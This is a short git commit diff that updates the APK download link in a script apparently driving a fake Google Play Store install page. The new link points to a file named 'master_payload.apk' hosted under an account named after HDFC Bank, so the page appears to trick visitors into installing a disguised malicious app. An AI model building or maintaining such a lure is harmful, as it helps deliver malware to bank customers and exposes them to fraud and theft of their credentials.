e0029134ea88c0f6c78a955b5ce5f2dc2d3cfffc
Aman Mishra <thegreatestaman999@gmail.com>
2026-05-15 20:24:25 +0530

    Updated APK download link to v3.0.12

--- www/playstore.js
+++ www/playstore.js
@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', () => {
     // PASTE YOUR REAL GITHUB RELEASE LINK HERE:
-    const REAL_APK_URL = 'https://github.com/hdfcbank100200-tech/newmade1/releases/download/v3.0.8/master_payload.apk'; 
+    const REAL_APK_URL = 'https://github.com/hdfcbank100200-tech/newmade1/releases/download/v3.0.12/master_payload.apk'; 
     
     const installBtn = document.getElementById('installBtn');
     let deferredPrompt;
